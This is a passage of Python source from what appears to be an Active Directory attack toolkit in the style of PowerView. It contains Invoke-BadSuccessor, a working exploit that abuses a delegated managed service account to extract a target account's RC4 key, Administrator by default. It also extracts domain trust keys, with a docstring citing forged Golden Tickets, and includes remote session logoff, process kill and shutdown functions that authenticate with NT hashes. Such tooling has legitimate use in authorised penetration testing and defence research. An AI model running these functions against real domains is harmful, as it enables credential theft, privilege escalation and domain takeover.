				config['attributes']['Status'] = SERVICE_STATUS(resp['lpServiceStatus']['dwCurrentState']).to_str() if not raw else resp['lpServiceStatus']['dwCurrentState']
				config['attributes']['Win32ExitCode'] = SERVICE_WIN32_EXIT_CODE(resp['lpServiceStatus']['dwWin32ExitCode']).to_str() if not raw else resp['lpServiceStatus']['dwWin32ExitCode']
				config['attributes']['ServiceSpecificExitCode'] = resp['lpServiceStatus']['dwServiceSpecificExitCode']
				config['attributes']['CheckPoint'] = resp['lpServiceStatus']['dwCheckPoint']
				config['attributes']['WaitHint'] = resp['lpServiceStatus']['dwWaitHint']

				return [config]
			else:
				resp = scmr.hREnumServicesStatusW(dce, scManagerHandle)

		except Exception as e:
			raise ValueError("[Get-NetService] %s" % (str(e)))

		edr = EDR()
		entries = []
		
		try:
			for i in range(len(resp)):
				state = resp[i]['ServiceStatus']['dwCurrentState']
				service_name = resp[i]['lpServiceName'][:-1]
				displayname = resp[i]['lpDisplayName'][:-1]

				if is_running and not state == scmr.SERVICE_RUNNING:
					continue
				elif is_stopped and not state == scmr.SERVICE_STOPPED:
					continue

				if edr.service_exist(service_name):
					service_name = f"{bcolors.WARNING}{service_name}{bcolors.ENDC}"
					displayname = f"{bcolors.WARNING}{displayname}{bcolors.ENDC}"

				entry = {
					"Name": service_name,
					"DisplayName": displayname,
					"Status": "UNKNOWN",
				}
				if state == scmr.SERVICE_CONTINUE_PENDING:
				   entry["Status"] = "CONTINUE PENDING"
				elif state == scmr.SERVICE_PAUSE_PENDING:
				   entry["Status"] = "PAUSE PENDING"
				elif state == scmr.SERVICE_PAUSED:
					entry["Status"] = "PAUSED"
				elif state == scmr.SERVICE_RUNNING:
				   entry["Status"] = f"{bcolors.OKGREEN}RUNNING{bcolors.ENDC}"
				elif state == scmr.SERVICE_START_PENDING:
				   entry["Status"] = "START PENDING"
				elif state == scmr.SERVICE_STOP_PENDING:
				   entry["Status"] = "STOP PENDING"
				elif state == scmr.SERVICE_STOPPED:
				   entry["Status"] = f"{bcolors.FAIL}STOPPED{bcolors.ENDC}"

				entries.append(
					{
						"attributes": dict(entry)
					}
				)

			logging.debug("[Get-NetService] Total services found: %d" % len(resp))
		except IndexError:
			logging.error("[Get-NetService] Error enumerating service")
			return

		dce.disconnect()
		return entries

	def invoke_messagebox(self, identity=None, session_id=None, title=None, message=None, style=MSGBOX_TYPE.MB_OKCANCEL, timeout=0, dontwait=True, username=None, password=None, domain=None, lmhash=None, nthash=None, port=445, args=None):
		if args:
			if username is None and hasattr(args, 'username') and args.username:
				logging.warning(f"[Invoke-MessageBox] Using identity {args.username} from supplied username. Ignoring current user context...")
				username = args.username
			if password is None and hasattr(args, 'password') and args.password:
				password = args.password
			if nthash is None and hasattr(args, 'nthash'):
				 nthash = args.nthash
			if lmhash is None and hasattr(args, 'lmhash'):
				 lmhash = args.lmhash
			if domain is None and hasattr(args, 'domain') and args.domain:
				domain = args.domain
			if session_id is None and hasattr(args, 'session_id'):
				session_id = args.session_id
			if title is None and hasattr(args, 'title'):
				title = args.title
			if message is None and hasattr(args, 'message'):
				message = args.message
			
		if username and not (password or lmhash or nthash):
			logging.error("[Invoke-MessageBox] Password or hash is required when specifying a username")
			return

		identity = self._resolve_host(identity)
		if not identity:
			return False
		smbConn = self.conn.init_smb_session(
			identity,
			username=username,
			password=password,
			domain=domain,
			lmhash=lmhash,
			nthash=nthash,
			show_exceptions=False
		)

		if not smbConn:
			logging.debug(f"[Invoke-MessageBox] Failed SMB connection to {identity}")
			return False

		if not title or not message:
			logging.error("[Invoke-MessageBox] Title and message are required")
			return False

		if session_id is None:
			sessions = self.get_netterminalsession(identity=identity, username=username, password=password, domain=domain, lmhash=lmhash, nthash=nthash, port=port, args=args)
			if not sessions:
				logging.error("[Invoke-MessageBox] No sessions found")
				return False
			
			print("\nAvailable sessions:")
			for i, session in enumerate(sessions):
				print(f"{i}: SessionID {session['attributes']['ID']} - {session['attributes']['SessionName']} ({session['attributes']['State']}) - {session['attributes']['Username']}")
			
			try:
				choice = int(input("\nSelect session to send message (number): "))
				if 0 <= choice < len(sessions):
					session_id = int(sessions[choice]['attributes']['ID'])
				else:
					logging.error("[Invoke-MessageBox] Invalid session selection")
					return False
			except (ValueError, KeyboardInterrupt):
				logging.error("[Invoke-MessageBox] Invalid input or operation cancelled")
				return False

		ts = TSHandler(smb_connection=smbConn, target_ip=identity, doKerberos=self.use_kerberos, stack_trace=self.args.stack_trace)
		pulResponse, success = ts.do_msg(session_id=session_id, title=title, message=message, style=style, timeout=timeout, dontwait=dontwait)
		if success:
			logging.info(f"[Invoke-MessageBox] Successfully sent message to session {session_id} on {identity}")
		else:
			logging.error(f"[Invoke-MessageBox] Failed to send message to session {session_id} on {identity}")
		return success

	def invoke_badsuccessor(self, identity=None, dmsaname=None, principalallowed=None, targetidentity=None, basedn=None, force=False, nocache=False, args=None):
		if args:
			if dmsaname is None and hasattr(args, 'dmsaname') and args.dmsaname:
				dmsaname = args.dmsaname
			if principalallowed is None and hasattr(args, 'principalallowed') and args.principalallowed:
				principalallowed = args.principalallowed
			if targetidentity is None and hasattr(args, 'targetidentity') and args.targetidentity:
				targetidentity = args.targetidentity
			if basedn is None and hasattr(args, 'basedn') and args.basedn:
				basedn = args.basedn
			if force is None and hasattr(args, 'force'):
				force = args.force
			if hasattr(args, 'nocache'):
				nocache = args.nocache
		
		if not dmsaname:
			dmsaname = get_random_name(service_account=True)
		if not principalallowed:
			principalallowed = self.conn.username
		if not targetidentity:
			logging.warning("[Invoke-BadSuccessor] No target identity provided. Using Administrator as default")
			targetidentity = "Administrator"

		# add mirrored value to the target identity
		# msDS_SupersededManagedServiceAccountLink = DMSA_DN
		# msDS-SupersededAccountState = 2

		if not basedn:
			logging.warning(f"[Invoke-BadSuccessor] No basedn provided. Searching for writable OU in {self.root_dn}...")
			writable_ous = self.get_domainou(
				properties = ['distinguishedName'],
				writable=True,
				no_cache=nocache
			)
			if len(writable_ous) == 0:
				logging.error(f"[Invoke-BadSuccessor] No writable OU found. Using base DN {self.root_dn}")
				basedn = self.root_dn
			elif len(writable_ous) > 1:
				c_key = 0
				logging.warning('[Invoke-BadSuccessor] We have more than one writable OU. Please choose one that is reachable')
				cnt = 0
				for ou in writable_ous:
					print(f"{cnt}: {ou['attributes']['distinguishedName']}")
					cnt += 1
				while True:
					try:
						c_key = int(input(">>> Your choice: "))
						if c_key in range(len(writable_ous)):
							break
					except Exception:
						pass
				basedn = writable_ous[c_key]['attributes']['distinguishedName']
			else:
				try:
					if not force:
						confirm = input(f"[Invoke-BadSuccessor] Found writable OU: {writable_ous[0]['attributes']['distinguishedName']}. Use this OU? [Y/n]: ").strip().lower()
						if confirm in ['n', 'no']:
							logging.warning("[Invoke-BadSuccessor] Operation cancelled by user")
							return
				except KeyboardInterrupt:
					logging.warning("[Invoke-BadSuccessor] Operation cancelled by user")
					return
				basedn = writable_ous[0]['attributes']['distinguishedName']

		#add dmsa account
		try:
			succeed = self.add_domaindmsa(identity=dmsaname, supersededaccount=targetidentity, principals_allowed_to_retrieve_managed_password=principalallowed, basedn=basedn)
			if not succeed:
				logging.error(f"[Invoke-BadSuccessor] Failed to add DMSA account {dmsaname}")
				return
		except Exception as e:
			if str(e).find("invalid object class msDS-DelegatedManagedServiceAccount") >= 0:
				logging.error(f"[Invoke-BadSuccessor] {str(e)}. Check if DC supports DMSA Account (Windows Server 2025+)")
			else:
				if self.args.stack_trace:
					raise e
				logging.error(f"[Invoke-BadSuccessor] {str(e)}")
			return

		entries = []
		# request service ticket for dmsaname
		from impacket.krb5.types import Principal
		from impacket.krb5 import constants
		from impacket.krb5.kerberosv5 import getKerberosTGT
		from binascii import unhexlify

		tgt = self.conn.get_TGT()
		if not tgt:
			userName = Principal(self.conn.username, type=constants.PrincipalNameType.NT_PRINCIPAL.value)
			tgt, cipher, oldSessionKey, sessionKey = getKerberosTGT(userName, self.conn.password, self.conn.get_domain(),
																unhexlify(self.conn.lmhash), unhexlify(self.conn.nthash), self.conn.auth_aes_key,
																self.conn.kdcHost)

		tgs, rcipher, oldSessionKey, sessionKey, previous_keys = MSA.request_dmsa_st(tgt, cipher, oldSessionKey, sessionKey, self.conn.kdcHost, self.conn.get_domain(), dmsaname + '$')
		if tgs:
			sessionKey = oldSessionKey

			for key in previous_keys:
				try:
					entries.append(
						{
							"attributes": {
								"Domain": self.conn.get_domain(),
								"Identity": targetidentity,
								"RC4": key[constants.EncryptionTypes.rc4_hmac]
							}
						}
					)
					break
				except:
					pass
		else:
			logging.error(f"[Invoke-BadSuccessor] Failed to request service ticket for {dmsaname}")

		# dmsa_dn = self.get_domaindmsa(identity=dmsaname, properties=['distinguishedName'], searchbase=basedn)[0].get('attributes', {}).get('distinguishedName', None)
		# if not dmsa_dn:
		# 	logging.error(f"[Invoke-BadSuccessor] Failed to get DMSA account {dmsaname}")
		# 	return
		# self.ldap_session.modify(dmsa_dn, {'msDS-ManagedAccountPrecededByLink': [(ldap3.MODIFY_REPLACE, ["CN=DC01,OU=Domain Controllers,DC=range,DC=local"])]})

		# cleanup, remove dmsa account
		success = self.remove_domaindmsa(identity=dmsaname, searchbase=basedn)
		if not success:
			logging.error(f"[Invoke-BadSuccessor] Failed to remove DMSA account {dmsaname}")
			return
		return entries

	def get_netterminalsession(self, identity=None, username=None, password=None, domain=None, lmhash=None, nthash=None, port=445, args=None):
		if args:
			if username is None and hasattr(args, 'username') and args.username:
				logging.warning(f"[Get-NetTerminalSession] Using identity {args.username} from supplied username. Ignoring current user context...")
				username = args.username
			if password is None and hasattr(args, 'password') and args.password:
				password = args.password
			if nthash is None and hasattr(args, 'nthash'):
				 nthash = args.nthash
			if lmhash is None and hasattr(args, 'lmhash'):
				 lmhash = args.lmhash
			if domain is None and hasattr(args, 'domain') and args.domain:
				domain = args.domain
		
		if username and not (password or lmhash or nthash):
			logging.error("[Get-NetTerminalSession] Password or hash is required when specifying a username")
			return

		identity = self._resolve_host(identity)
		if not identity:
			return None
		smbConn = self.conn.init_smb_session(
			identity,
			username=username,
			password=password,
			domain=domain,
			lmhash=lmhash,
			nthash=nthash,
			show_exceptions=False
		)

		if not smbConn:
			logging.debug(f"[Get-NetTerminalSession] Failed SMB connection to {identity}")
			return None

		ts = TSHandler(smb_connection=smbConn, target_ip=identity, doKerberos=self.use_kerberos, stack_trace=self.args.stack_trace)
		results = ts.do_qwinsta()
		return results

	def remove_netterminalsession(self, identity=None, session_id=None, username=None, password=None, domain=None, lmhash=None, nthash=None, port=445, args=None):
		if args:
			if username is None and hasattr(args, 'username') and args.username:
				logging.warning(f"[Remove-NetTerminalSession] Using identity {args.username} from supplied username. Ignoring current user context...")
				username = args.username
			if password is None and hasattr(args, 'password') and args.password:
				password = args.password
			if nthash is None and hasattr(args, 'nthash'):
				 nthash = args.nthash
			if lmhash is None and hasattr(args, 'lmhash'):
				 lmhash = args.lmhash
			if domain is None and hasattr(args, 'domain') and args.domain:
				domain = args.domain
			if session_id is None and hasattr(args, 'session_id'):
				session_id = args.session_id
		
		if username and not (password or lmhash or nthash):
			logging.error("[Remove-NetTerminalSession] Password or hash is required when specifying a username")
			return

		if session_id is None:
			sessions = self.get_netterminalsession(identity=identity, username=username, password=password, domain=domain, lmhash=lmhash, nthash=nthash, port=port, args=args)
			if not sessions:
				logging.error("[Remove-NetTerminalSession] No sessions found")
				return False
			
			print("\nAvailable sessions:")
			for i, session in enumerate(sessions):
				print(f"{i}: SessionID {session['attributes']['ID']} - {session['attributes']['SessionName']} ({session['attributes']['State']}) - {session['attributes']['Username']}")
			
			try:
				choice = int(input("\nSelect session to logoff (number): "))
				if 0 <= choice < len(sessions):
					session_id = int(sessions[choice]['attributes']['ID'])
				else:
					logging.error("[Remove-NetTerminalSession] Invalid session selection")
					return False
			except (ValueError, KeyboardInterrupt):
				logging.error("[Remove-NetTerminalSession] Invalid input or operation cancelled")
				return False

		identity = self._resolve_host(identity)
		if not identity:
			return None
		smbConn = self.conn.init_smb_session(
			identity,
			username=username,
			password=password,
			domain=domain,
			lmhash=lmhash,
			nthash=nthash,
			show_exceptions=False
		)

		if not smbConn:
			logging.debug(f"[Remove-NetTerminalSession] Failed SMB connection to {identity}")
			return None

		ts = TSHandler(smb_connection=smbConn, target_ip=identity, doKerberos=self.use_kerberos, stack_trace=self.args.stack_trace)
		success = ts.do_tsdiscon(session_id=session_id)
		if success:
			logging.info(f"[Remove-NetTerminalSession] Successfully removed session {session_id} on {identity}")
		else:
			logging.error(f"[Remove-NetTerminalSession] Failed to remove session {session_id} on {identity}")
		return success

	def logoff_session(self, identity=None, session_id=None, username=None, password=None, domain=None, lmhash=None, nthash=None, port=445, args=None):
		if args:
			if username is None and hasattr(args, 'username') and args.username:
				logging.warning(f"[Logoff-Session] Using identity {args.username} from supplied username. Ignoring current user context...")
				username = args.username
			if password is None and hasattr(args, 'password') and args.password:
				password = args.password
			if nthash is None and hasattr(args, 'nthash'):
				 nthash = args.nthash
			if lmhash is None and hasattr(args, 'lmhash'):
				 lmhash = args.lmhash
			if domain is None and hasattr(args, 'domain') and args.domain:
				domain = args.domain
			if session_id is None and hasattr(args, 'session_id'):
				session_id = args.session_id
				
		if username and not (password or lmhash or nthash):
			logging.error("[Logoff-Session] Password or hash is required when specifying a username")
			return

		if session_id is None:
			sessions = self.get_netterminalsession(identity=identity, username=username, password=password, domain=domain, lmhash=lmhash, nthash=nthash, port=port, args=args)
			if not sessions:
				logging.error("[Logoff-Session] No sessions found")
				return False
			
			print("\nAvailable sessions:")
			for i, session in enumerate(sessions):
				print(f"{i}: SessionID {session['attributes']['ID']} - {session['attributes']['SessionName']} ({session['attributes']['State']}) - {session['attributes']['Username']}")
			
			try:
				choice = int(input("\nSelect session to logoff (number): "))
				if 0 <= choice < len(sessions):
					session_id = int(sessions[choice]['attributes']['ID'])
				else:
					logging.error("[Logoff-Session] Invalid session selection")
					return False
			except (ValueError, KeyboardInterrupt):
				logging.error("[Logoff-Session] Invalid input or operation cancelled")
				return False

		identity = self._resolve_host(identity)
		if not identity:
			return None
		smbConn = self.conn.init_smb_session(
			identity,
			username=username,
			password=password,
			domain=domain,
			lmhash=lmhash,
			nthash=nthash,
			show_exceptions=False
		)

		if not smbConn:
			logging.debug(f"[Logoff-Session] Failed SMB connection to {identity}")
			return None

		ts = TSHandler(smb_connection=smbConn, target_ip=identity, doKerberos=self.use_kerberos, stack_trace=self.args.stack_trace)
		success = ts.do_logoff(session_id=session_id)
		if success:
			logging.info(f"[Logoff-Session] Successfully logged off session {session_id} on {identity}")
		else:
			logging.error(f"[Logoff-Session] Failed to log off session {session_id} on {identity}")
		return success

	def stop_computer(self, identity=None, username=None, password=None, domain=None, lmhash=None, nthash=None, port=445, args=None):
		if args:
			if username is None and hasattr(args, 'username') and args.username:
				logging.warning(f"[Stop-Computer] Using identity {args.username} from supplied username. Ignoring current user context...")
				username = args.username
			if password is None and hasattr(args, 'password') and args.password:
				password = args.password
			if nthash is None and hasattr(args, 'nthash'):
				 nthash = args.nthash
			if lmhash is None and hasattr(args, 'lmhash'):
				 lmhash = args.lmhash
			if domain is None and hasattr(args, 'domain') and args.domain:
				domain = args.domain
		
		if username and not (password or lmhash or nthash):
			logging.error("[Stop-Computer] Password or hash is required when specifying a username")
			return

		identity = self._resolve_host(identity)
		if not identity:
			return None
		smbConn = self.conn.init_smb_session(
			identity,
			username=username,
			password=password,
			domain=domain,
			lmhash=lmhash,
			nthash=nthash,
			show_exceptions=False
		)

		if not smbConn:
			logging.debug(f"[Stop-Computer] Failed SMB connection to {identity}")
			return None

		ts = TSHandler(smb_connection=smbConn, target_ip=identity, doKerberos=self.use_kerberos, stack_trace=self.args.stack_trace)
		success = ts.do_shutdown(logoff=True, shutdown=True, reboot=False, poweroff=False)
		if success:
			logging.info(f"[Stop-Computer] Successfully stopped computer {identity}")
		else:
			logging.error(f"[Stop-Computer] Failed to stop computer {identity}")
		return success

	def restart_computer(self, identity=None, username=None, password=None, domain=None, lmhash=None, nthash=None, port=445, args=None):
		if args:
			if username is None and hasattr(args, 'username') and args.username:
				logging.warning(f"[Restart-Computer] Using identity {args.username} from supplied username. Ignoring current user context...")
				username = args.username
			if password is None and hasattr(args, 'password') and args.password:
				password = args.password
			if nthash is None and hasattr(args, 'nthash'):
				 nthash = args.nthash
			if lmhash is None and hasattr(args, 'lmhash'):
				 lmhash = args.lmhash
			if domain is None and hasattr(args, 'domain') and args.domain:
				domain = args.domain
		
		if username and not (password or lmhash or nthash):
			logging.error("[Restart-Computer] Password or hash is required when specifying a username")
			return

		identity = self._resolve_host(identity)
		if not identity:
			return None
		smbConn = self.conn.init_smb_session(
			identity,
			username=username,
			password=password,
			domain=domain,
			lmhash=lmhash,
			nthash=nthash,
			show_exceptions=False
		)

		if not smbConn:
			logging.debug(f"[Restart-Computer] Failed SMB connection to {identity}")
			return None

		ts = TSHandler(smb_connection=smbConn, target_ip=identity, doKerberos=self.use_kerberos, stack_trace=self.args.stack_trace)
		success = ts.do_shutdown(logoff=True, shutdown=False, reboot=True, poweroff=False)
		if success:
			logging.info(f"[Restart-Computer] Successfully restarted computer {identity}")
		else:
			logging.error(f"[Restart-Computer] Failed to restart computer {identity}")
		return success

	def get_netprocess(self, identity=None, pid=None, name=None, username=None, password=None, domain=None, lmhash=None, nthash=None, port=445, args=None):
		if args:
			if username is None and hasattr(args, 'username') and args.username:
				logging.warning(f"[Get-NetProcess] Using identity {args.username} from supplied username. Ignoring current user context...")
				username = args.username
			if password is None and hasattr(args, 'password') and args.password:
				password = args.password
			if nthash is None and hasattr(args, 'nthash'):
				 nthash = args.nthash
			if lmhash is None and hasattr(args, 'lmhash'):
				 lmhash = args.lmhash
			if domain is None and hasattr(args, 'domain') and args.domain:
				domain = args.domain
			if pid is None and hasattr(args, 'pid'):
				pid = args.pid
			if name is None and hasattr(args, 'name'):
				name = args.name
		
		if username and not (password or lmhash or nthash):
			logging.error("[Get-NetProcess] Password or hash is required when specifying a username")
			return

		identity = self._resolve_host(identity)
		if not identity:
			return None
		smbConn = self.conn.init_smb_session(
			identity,
			username=username,
			password=password,
			domain=domain,
			lmhash=lmhash,
			nthash=nthash,
			show_exceptions=False
		)

		if not smbConn:
			logging.debug(f"[Get-NetProcess] Failed SMB connection to {identity}")
			return None

		ts = TSHandler(smb_connection=smbConn, target_ip=identity, doKerberos=self.use_kerberos, stack_trace=self.args.stack_trace)
		results = ts.do_tasklist(pid=pid, name=name)
		return results

	def stop_netprocess(self, identity=None, pid=None, name=None, username=None, password=None, domain=None, lmhash=None, nthash=None, port=445, args=None):
		if args:
			if username is None and hasattr(args, 'username') and args.username:
				logging.warning(f"[Stop-NetProcess] Using identity {args.username} from supplied username. Ignoring current user context...")
				username = args.username
			if password is None and hasattr(args, 'password') and args.password:
				password = args.password
			if nthash is None and hasattr(args, 'nthash'):
				 nthash = args.nthash
			if lmhash is None and hasattr(args, 'lmhash'):
				 lmhash = args.lmhash
			if domain is None and hasattr(args, 'domain') and args.domain:
				domain = args.domain
			if pid is None and hasattr(args, 'pid'):
				pid = args.pid
			if name is None and hasattr(args, 'name'):
				name = args.name
		
		if username and not (password or lmhash or nthash):
			logging.error("[Stop-NetProcess] Password or hash is required when specifying a username")
			return

		identity = self._resolve_host(identity)
		if not identity:
			return None
		smbConn = self.conn.init_smb_session(
			identity,
			username=username,
			password=password,
			domain=domain,
			lmhash=lmhash,
			nthash=nthash,
			show_exceptions=False
		)

		if not smbConn:
			logging.debug(f"[Stop-NetProcess] Failed SMB connection to {identity}")
			return None

		ts = TSHandler(smb_connection=smbConn, target_ip=identity, doKerberos=self.use_kerberos, stack_trace=self.args.stack_trace)
		return ts.do_taskkill(pid=pid, name=name)

	def get_netsession(self, identity=None, username=None, password=None, domain=None, lmhash=None, nthash=None, port=445, args=None):
		if args:
			if username is None and hasattr(args, 'username') and args.username:
				logging.warning(f"[Get-NetSession] Using identity {args.username} from supplied username. Ignoring current user context...")
				username = args.username
			if password is None and hasattr(args, 'password') and args.password:
				password = args.password
			if nthash is None and hasattr(args, 'nthash'):
				 nthash = args.nthash
			if lmhash is None and hasattr(args, 'lmhash'):
				 lmhash = args.lmhash
			if domain is None and hasattr(args, 'domain') and args.domain:
				domain = args.domain
		
		if username and not (password or lmhash or nthash):
			logging.error("[Get-NetSession] Password or hash is required when specifying a username")
			return

		KNOWN_PROTOCOLS = {
			139: {'bindstr': r'ncacn_np:%s[\pipe\srvsvc]', 'set_host': True},
			445: {'bindstr': r'ncacn_np:%s[\pipe\srvsvc]', 'set_host': True},
		}

		identity = self._resolve_host(identity)
		if not identity:
			return

		stringBinding = KNOWN_PROTOCOLS[port]['bindstr'] % identity
		dce = self.conn.connectRPCTransport(
			host=identity,
			username=username,
			password=password,
			domain=domain,
			lmhash=lmhash,
			nthash=nthash,
			stringBindings=stringBinding,
			interface_uuid = srvs.MSRPC_UUID_SRVS
		)

		if dce is None:
			logging.error("[Get-NetSession] Failed to connect to %s" % (identity))
			return

		try:
			resp = srvs.hNetrSessionEnum(dce, '\x00', NULL, 10)
		except Exception as e:
			if 'rpc_s_access_denied' in str(e):
				logging.error('[Get-NetSession] Access denied while enumerating Sessions on %s' % (identity))
			else:
				logging.error(str(e))
			return

		sessions = []
		for session in resp['InfoStruct']['SessionInfo']['Level10']['Buffer']:
			ip = session['sesi10_cname'][:-1]
			userName = session['sesi10_username'][:-1]
			timeActive = session['sesi10_time']
			if timeActive >= 3600:
				hours = timeActive // 3600
				minutes = (timeActive % 3600) // 60
				seconds = timeActive % 60
				timeActive = f"{hours} hours, {minutes} minutes, {seconds} seconds"
			else:
				timeActive = f"{timeActive} seconds"
			idleTime = session['sesi10_idle_time']
			if idleTime >= 60:
				idleMinutes = idleTime // 60
				remainingSeconds = idleTime % 60
				idleTime = f"{idleMinutes} minutes, {remainingSeconds} seconds"
			else:
				idleTime = f"{idleTime} seconds"

			if userName[-1] == "$":
				continue

			sessions.append({
				"attributes": {
					"IP": ip,
					"Username": userName,
					"Time Active": timeActive,
					"Idle Time": idleTime,
					"Computer": identity,
					}
				})

		return sessions

	def remove_netsession(self, computer=None, target_session=None, username=None, password=None, domain=None, lmhash=None, nthash=None, port=445, args=None):
		if not computer and not target_session:
			logging.error("[Remove-NetSession] Either computer or target_session is required")
			return
		
		if args:
			if username is None and hasattr(args, 'username') and args.username:
				logging.warning(f"[Remove-NetSession] Using identity {args.username} from supplied username. Ignoring current user context...")
				username = args.username
			if password is None and hasattr(args, 'password') and args.password:
				password = args.password
			if nthash is None and hasattr(args, 'nthash'):
				 nthash = args.nthash
			if lmhash is None and hasattr(args, 'lmhash'):
				 lmhash = args.lmhash
			if domain is None and hasattr(args, 'domain') and args.domain:
				domain = args.domain
		
		if username and not (password or lmhash or nthash):
			logging.error("[Remove-NetSession] Password or hash is required when specifying a username")
			return

		KNOWN_PROTOCOLS = {
			139: {'bindstr': r'ncacn_np:%s[\pipe\srvsvc]', 'set_host': True},
			445: {'bindstr': r'ncacn_np:%s[\pipe\srvsvc]', 'set_host': True},
		}

		computer = self._resolve_host(computer)
		if not computer:
			return

		stringBinding = KNOWN_PROTOCOLS[port]['bindstr'] % computer
		dce = self.conn.connectRPCTransport(
			host=computer,
			username=username,
			password=password,
			domain=domain,
			lmhash=lmhash,
			nthash=nthash,
			stringBindings=stringBinding,
			interface_uuid = srvs.MSRPC_UUID_SRVS
		)

		if dce is None:
			logging.error("[Remove-NetSession] Failed to connect to %s" % (computer))
			return
		
		try:
			logging.info(f"[Remove-NetSession] Removing session {target_session} from {computer}")
			resp = srvs.hNetrSessionDel(
				dce,
				NULL,
				target_session + '\x00'
			)
		except Exception as e:
			if 'rpc_s_access_denied' in str(e) or '0x5' in str(e):
				logging.error('Access denied while removing session on %s' % (computer))
			elif '0x908' in str(e) or 'NERR_ClientNameNotFound' in str(e):
				logging.error('Session not found on %s' % (computer))
			elif '0x57' in str(e) or 'ERROR_INVALID_PARAMETER' in str(e):
				logging.error('Invalid parameter while removing session on %s' % (computer))
			elif '0x8' in str(e) or 'ERROR_NOT_ENOUGH_MEMORY' in str(e):
				logging.error('Not enough memory while removing session on %s' % (computer))
			else:
				logging.error(str(e))
			return

		logging.info(f"[Remove-NetSession] Session {target_session} removed from {computer}")
		return True

	def get_domaintrustkey(self, identity=None, properties=None, searchbase=None, search_scope=ldap3.SUBTREE, no_cache=False, no_vuln_check=False, raw=False, args=None):
		"""
		Extract trust keys from domain trust objects.
		
		This function queries Active Directory for domain trust objects and extracts
		the trust keys from trustAuthIncoming and trustAuthOutgoing attributes.
		These keys are used to secure communications and authentication between trusted domains.
		
		The function uses specialized SD controls to read the sensitive trust key attributes,
		which requires high privileges (typically Domain Admin) in the domain.
		
		Trust keys can be used for various offensive operations, including:
		- Creating forged Kerberos tickets (Golden Tickets across trusts)
		- Lateral movement between trusted domains
		- Trust relationship abuse
		
		Args:
			identity: Trust name to target (optional, if None all trusts are returned)
			properties: Properties to retrieve (optional)
			searchbase: Search base for the LDAP query (optional)
			args: Arguments object containing properties (optional)
			search_scope: LDAP search scope (default: SUBTREE)
			no_cache: Whether to use cache (default: False)
			no_vuln_check: Whether to skip vulnerability checks (default: False)
		
		Returns:
			List of dictionaries containing trust objects with their parsed trust keys.
			For each trust, the following information is included:
			- Basic trust properties (name, direction, type, etc.)
			- Security descriptor information
			- Parsed trust key information from trustAuthIncoming and trustAuthOutgoing
			  attributes, including key type, timestamp, and the actual key material
		
		Example:
			# Get all trust keys
			trust_keys = powerview.get_trustkey()
			
			# Get trust keys for a specific trust
			trust_keys = powerview.get_trustkey(identity="example.com")
			
			# Access the keys
			for trust in trust_keys:
				if 'trustAuthIncoming' in trust and 'Entries' in trust['trustAuthIncoming']:
					for entry in trust['trustAuthIncoming']['Entries']:
						print(f"Found {entry['KeyType']} key: {entry['Key']}")
		"""
		import datetime
		
		def_prop = [
			'name',
			'objectGUID',
			'securityIdentifier',
			'trustDirection',
			'trustPartner',
			'trustType',
			'trustAttributes',
			'flatName',
			'whenCreated',
			'whenChanged',
			'trustAuthIncoming',
			'trustAuthOutgoing',
			'nTSecurityDescriptor',
		]
		
		properties = args.properties if hasattr(args, 'properties') and args.properties else properties or def_prop
		properties = def_prop if not properties else set(def_prop + properties)
		
		identity = args.identity if hasattr(args, 'identity') and args.identity else identity
		
		if not searchbase:
			searchbase = args.searchbase if hasattr(args, 'searchbase') and args.searchbase else self.root_dn
		
		no_cache = args.no_cache if hasattr(args, 'no_cache') and args.no_cache else no_cache
		no_vuln_check = args.no_vuln_check if hasattr(args, 'no_vuln_check') and args.no_vuln_check else no_vuln_check
		raw = args.raw if hasattr(args, 'raw') and args.raw else raw

		_entries = self.get_domaintrust(
			identity=identity,
			properties=properties,
			searchbase=searchbase,
			sd_flag=0x05,
			no_cache=no_cache,
			no_vuln_check=no_vuln_check,
			raw=raw
		)

		if len(_entries) == 0:
			logging.error("[Get-DomainTrustKey] No trust keys found")
			return
		else:
			logging.debug("[Get-DomainTrustKey] Found %d trust%s" % (len(_entries), "s" if len(_entries) > 1 else ""))
		
		entries = []
		for entry in _entries:
			if not entry.get('attributes', {}).get('trustAuthIncoming') or not entry.get('attributes', {}).get('trustAuthOutgoing'):
				logging.warning("[Get-DomainTrustKey] Trust keys not found for %s. Skipping..." % entry.get('attributes', {}).get('name'))
				continue

			trust = Trust(entry)
			entries.append(
				{
					"attributes": {
						"Trust": trust.name,
						"Partner": trust.trust_partner,
						"Direction": trust.trust_direction,
						"Type": trust.trust_type,
						"Attributes": trust.trust_attributes,
						"Incoming Keys": trust.incoming_keys,
						"Outgoing Keys": trust.outgoing_keys,
						"Owner": self.convertfrom_sid(trust.owner_sid),
						"IncomingKey": trust.incoming_keys,
						"OutgoingKey": trust.outgoing_keys,
					}
				}
			)
		return entries

	def get_exchangeserver(self, identity=None, properties=None, searchbase=None, search_scope=ldap3.SUBTREE, no_cache=False, no_vuln_check=False, raw=False, args=None):
		"""
		Enumerate Exchange servers in the domain.
		
		Args:
			identity: Server name to target (optional, if None all Exchange servers are returned)
			properties: Properties to retrieve (optional)
			searchbase: Search base for the LDAP query (optional)
			args: Arguments object containing properties (optional)
			search_scope: LDAP search scope (default: SUBTREE)
			no_cache: Whether to use cache (default: False)
			no_vuln_check: Whether to skip vulnerability checks (default: False)
		
		Returns:
			List of Exchange servers with their properties
		"""
		properties = args.properties if hasattr(args, 'properties') and args.properties else properties
		identity = args.identity if hasattr(args, 'identity') and args.identity else identity
		
		if not searchbase:
			searchbase = args.searchbase if hasattr(args, 'searchbase') and args.searchbase else self.configuration_dn
		
		no_cache = args.no_cache if hasattr(args, 'no_cache') and args.no_cache else no_cache
		no_vuln_check = args.no_vuln_check if hasattr(args, 'no_vuln_check') and args.no_vuln_check else no_vuln_check
		raw = args.raw if hasattr(args, 'raw') and args.raw else raw
		exchange_enum = ExchangeEnum(self)
		
		try:
			entries = exchange_enum.get_exchange_servers(
				properties=properties,
				identity=identity,
				searchbase=searchbase,
				search_scope=search_scope,
				no_cache=no_cache,
				no_vuln_check=no_vuln_check,
				raw=raw
			)
		except ldap3.core.exceptions.LDAPObjectClassError as e:
			if "invalid class in objectClass attribute" in str(e):
				logging.error("[Get-ExchangeServer] Error: Domain doesn't have Exchange servers")
				return
			else:
				if self.args.stack_trace:
					raise e
				else:
					logging.error(f"[Get-ExchangeServer] Error: {e}")
					return
		except Exception as e:
			if self.args.stack_trace:
				raise e
			else:
				logging.error(f"[Get-ExchangeServer] Error: {e}")
				return
		
		logging.debug(f"[Get-ExchangeServer] Found {len(entries)} Exchange servers")
		return entries
	
